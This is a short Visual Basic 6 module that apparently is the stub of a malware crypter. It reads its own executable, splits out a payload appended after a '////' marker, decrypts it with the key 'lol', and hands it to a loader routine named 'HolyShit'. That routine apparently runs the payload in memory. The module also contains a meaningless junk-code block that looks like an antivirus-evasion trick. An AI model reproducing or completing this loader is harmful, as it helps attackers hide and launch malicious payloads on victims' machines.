Attribute VB_Name = "Module1"
Sub Main()


Dim daten As String
Dim hello() As String

Dim Game As String
Game = "Yes!"
If Game = "Yes!" Then
Game = "No!"
End If
Open App.Path & "\" & App.EXEName & ".exe" For Binary As #1
daten = Space(LOF(1))
Get #1, , daten
Close #1
hello() = Split(daten, "////")
HolyShit App.Path + "\" + App.EXEName & ".exe", StrConv(strDemda(hello(1), "lol"), vbFromUnicode), ""
End Sub
